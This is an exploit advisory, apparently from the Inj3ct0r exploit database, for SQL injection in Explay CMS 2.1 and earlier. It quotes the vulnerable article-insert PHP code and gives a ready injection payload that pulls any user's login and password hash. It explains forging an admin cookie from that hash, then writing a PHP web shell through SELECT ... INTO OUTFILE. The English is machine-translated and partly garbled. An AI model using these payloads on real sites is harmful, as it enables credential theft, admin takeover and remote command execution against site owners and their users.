Explay CMS <= 2.1 SQL Injection Vulnerabilities
===============================================

1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0                          
0     _                   __           __       __                     1
1   /&#039; \            __  /&#039;__`\        /\ \__  /&#039;__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /&#039; _ `\ \/\ \/_/_\_<_  /&#039;___\ \ \/\ \ \ \ \/\`&#039;__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      0
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-1

#[+] Discovered By   : Inj3ct0r
#[+] Site            : Inj3ct0r.com
#[+] support e-mail  : submit[at]inj3ct0r.com


The vulnerability makes it possible to obtain the password hash of any user.
Exploitation of the vulnerability can be disabled when PHP-directive magic_quotes_gpc.

To obtain the password you want to add an article (http:// [explay] / my_articles / add /) with a code specially formed SQL-query in the box art_body (ie the main text of the article).

Code adding new articles:
modules / articles / mysql.class.php

PHP code :


public function add_article ($art) {
        $this->db->query ("INSERT INTO ".DB_PEREFIX."_articles VALUES (
                        0,
                        &#039;".$art[&#039;art_category&#039;]."&#039;,
                        &#039;".$art[&#039;art_header&#039;]."&#039;,
                        &#039;".$art[&#039;art_body&#039;]."&#039;,
                        &#039;".User::$properties[&#039;user_id&#039;]."&#039;,
                        &#039;".time()."&#039;,
                        &#039;".$art[&#039;art_comments&#039;]."&#039;,
                        &#039;&#039;,
                        &#039;&#039;,
                        &#039;".$art[&#039;art_publik&#039;]."&#039;,
                        &#039;no&#039;,
                        &#039;".$art[&#039;art_visible&#039;]."&#039;,
                        &#039;".$art[&#039;art_tags&#039;]."&#039;,
                        &#039;0&#039;,
                        &#039;&#039;,
                        &#039;0&#039;,
                        &#039;".$art[&#039;auto_tag&#039;]."&#039;
        )");


 

PHP code:

 aaaaa&#039;,  
(SELECT user_id FROM expl_users WHERE user_login=&#039;<UR_LOGIN>&#039;),  
&#039;1228445451&#039;,  
&#039;on&#039;,  
&#039;&#039;,  
&#039;&#039;,  
&#039;yes&#039;,  
&#039;no&#039;,  
&#039;on&#039;,  
(SELECT concat_ws(0x3a, user_login, user_password) FROM expl_users WHERE user_login=&#039;<USER&#039;S_LOGIN>&#039;),
&#039;0&#039;,  
&#039;&#039;,  
&#039;0&#039;,  
&#039;yes&#039; )/*


Subqueries :

(SELECT user_id FROM expl_users WHERE user_login=&#039;<UR_LOGIN>&#039;)



As a result, execute such a query:

PHP code:

 INSERT INTO expl_articles VALUES ( 0,  
&#039;&#039;,  
&#039;some_title&#039;,  
&#039;aaaaa&#039;,  
(SELECT user_id FROM expl_users WHERE user_login=&#039;<UR_LOGIN>&#039;),  
&#039;1228445451&#039;,  
&#039;on&#039;,  
&#039;&#039;,  
&#039;&#039;,  
&#039;yes&#039;,  
&#039;no&#039;,  
&#039;on&#039;,  
(SELECT concat_ws(0x3a, user_login, user_password) FROM expl_users WHERE user_login=&#039;<USER&#039;S_LOGIN>&#039;),
&#039;0&#039;,  
&#039;&#039;,  
&#039;0&#039;,  
&#039;yes )



The result of the nested query in the form of "login: password" in the tags, such as:

admin:012ce7449da5b5afb89db5f32810946ea94098e6

 
There is however one subtlety. Passwords are encrypted by different algorithms:

PHP code:

 function expl_hash($str) {
    if (function_exists(&#039;sha1&#039;))
        return sha1($str);  
    elseif (function_exists(&#039;mhash&#039;))
        return bin2hex(mhash(MHASH_SHA1, $str));
    else
        return md5($str);
}


 
Type hash lekgo determine the length of the line. (MD5 - 32 bytes, SHA1 - 40 bytes).

To the great happiness, engine user authentication is implemented through Cookies, so that we can not Brutus hash,
and just create a cookie with the login and pass the appropriate values. Now we are admin.

 
Getting shell
But that&#039;s not all! Built-in admin interface to perform arbitrary SQL-queries allows us to create a shell (if included file_priv):

PHP code:

SELECT &#039;<?php system($_GET["cmd"]) ?>&#039; INTO OUTFILE &#039;????_?_??????/shell.php&#039;

 
Here, we must obtain your own user_id, as it should indicate if the box so that we have been the author of the article.
You can of course not specify "WHERE user_login = &#039;<UR_LOGIN>&#039;" and to write such a unit (user_id = 1), but then the author would himself admin =).
<UR_LOGIN> - Our name (not to be confused with the name!).



